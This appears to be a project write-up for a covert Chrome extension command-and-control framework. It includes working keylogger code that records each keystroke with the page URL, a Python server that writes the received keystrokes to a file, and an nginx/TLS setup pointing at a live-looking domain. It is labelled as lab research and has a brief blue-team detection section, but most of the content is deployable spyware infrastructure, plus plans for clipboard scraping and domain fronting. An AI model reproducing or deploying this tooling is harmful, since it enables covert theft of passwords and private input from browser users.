Covert Chrome Extension C2 Framework (Research Project)

📄 Executive Summary

This project is a comprehensive, self-contained simulation of a covert Command-and-Control (C2) framework delivered through a Google Chrome extension. The aim was to understand how web technologies can be abused by sophisticated threat actors to evade detection and maintain persistent access using standard browser behavior. The project includes a full infrastructure setup on AWS, leveraging secure communication over HTTPS with realistic browser traffic patterns, and keystroke exfiltration from user interaction.

Important: This project was built strictly for cybersecurity research, red team development, and educational purposes. All experimentation occurred in a private, controlled lab environment.

💡 Goals & Objectives

Investigate the feasibility of using Chrome extensions as covert implants

Develop a functioning HTTPS-based C2 channel using standard web protocols

Deploy and harden an AWS-hosted backend infrastructure with reverse proxying

Study and document the traffic and endpoint characteristics of the C2 for detection research

🧰 Architecture Overview

Client-Side Implant: Chrome Extension

Manifest v3 compliant

Hooks into document.onkeydown to capture keystrokes

Stores logs in chrome.storage.local

Sends logs over HTTPS POST or WebSocket every 5 seconds

Mimics normal user browsing traffic

Server-Side:

Hosted on AWS EC2 Ubuntu instance

Runs Python HTTP server for log reception

Uses Nginx as a reverse proxy and TLS terminator

TLS certificate provided by Let's Encrypt via certbot

Traffic flows from Chrome -> nginx:443 -> Python:8000

DNS & Domain:

Managed by Cloudflare DNS for domain threathunter.vip

Set up A records and MX records for future email and identity testing

Used Elastic IP to ensure persistent endpoint between reboots

📁 Chrome Extension Components

manifest.json

Specifies permissions (storage, <all_urls>, etc.)

Declares background service worker and content script

content.js

(function () {
  document.addEventListener("keydown", function (e) {
    const entry = {
      k: e.key,
      t: Date.now(),
      u: window.location.href
    };

    chrome.storage.local.get({ d: [] }, function (res) {
      let logs = res.d;
      logs.push(entry);
      chrome.storage.local.set({ d: logs });
    });
  });
})();

background.js

Establishes persistent WebSocket or fetch beacon to server

Periodically flushes buffer from chrome.storage.local

🚀 Server Deployment

Step 1: AWS EC2 Launch

Chose Ubuntu 22.04 LTS

Instance type: t3.micro (Free Tier eligible)

Elastic IP attached

Step 2: Nginx Setup

Installed via apt

Configured in /etc/nginx/sites-available/default

server {
    listen 443 ssl;
    server_name threathunter.vip;

    ssl_certificate /etc/letsencrypt/live/threathunter.vip/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/threathunter.vip/privkey.pem;

    location /submit {
        proxy_pass http://127.0.0.1:8000;
    }
}

Step 3: TLS with Let's Encrypt

sudo certbot --nginx -d threathunter.vip

Step 4: Python C2 Server

from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path != '/submit':
            self.send_response(404)
            return
        length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(length))
        with open("keystrokes.txt", "a") as f:
            for log in data.get("logs", []):
                f.write(f"[{log['t']}] {log['u']}: {log['k']}\n")
        self.send_response(200)

if __name__ == "__main__":
    HTTPServer(("127.0.0.1", 8000), C2Handler).serve_forever()

Step 5: System Automation

crontab to auto-start Nginx and C2 server on reboot

Python server wrapped in a shell script and daemonized

🎨 Screenshot Section (to include in GitHub or LinkedIn)

1. Chrome Extension Keylogging in DevTools

(Insert screenshot of chrome.storage.local.get() showing captured keystrokes)

2. C2 Server Terminal Output

(Show terminal with [+] Wrote X keystrokes to keystrokes.txt])

3. HTTPS Request Capture in BurpSuite or Wireshark

(Display packet capture showing encrypted HTTPS or WebSocket payloads)

4. Nginx SSL Configuration

(Screenshot of nginx -t test success with cert paths)

🔐 Security & Detection Considerations

Red Team:

Covert transport using legitimate protocols

Persistence across browser restarts

Chrome's chrome.storage and service_worker APIs leveraged

Blue Team:

Detect unusual WebSocket or beaconing patterns

Monitor extension permissions and behavior

Watch for high frequency chrome.storage.local.get() reads

Analyze keystrokes.txt for anomalies or unexpected activity

🏆 Outcome

The project successfully demonstrated a full lifecycle attack simulation using browser-native APIs and HTTPS-based covert transport. While realistic and difficult to detect, this setup highlights critical visibility gaps in modern endpoint and network defense strategies.

🔧 Future Work

Add clipboard scraping and DOM snapshotting

Use domain fronting and CDN-based endpoint hosting

Log frequency tuning and stealthier beacons

Integrate machine learning to classify user behavior based on logs

📅 Date of Version

Published: July 11, 2025

⚖️ License

This project is licensed under the MIT License. See LICENSE for more information.

🚧 Legal

This research is intended for legal, educational, and ethical purposes only.


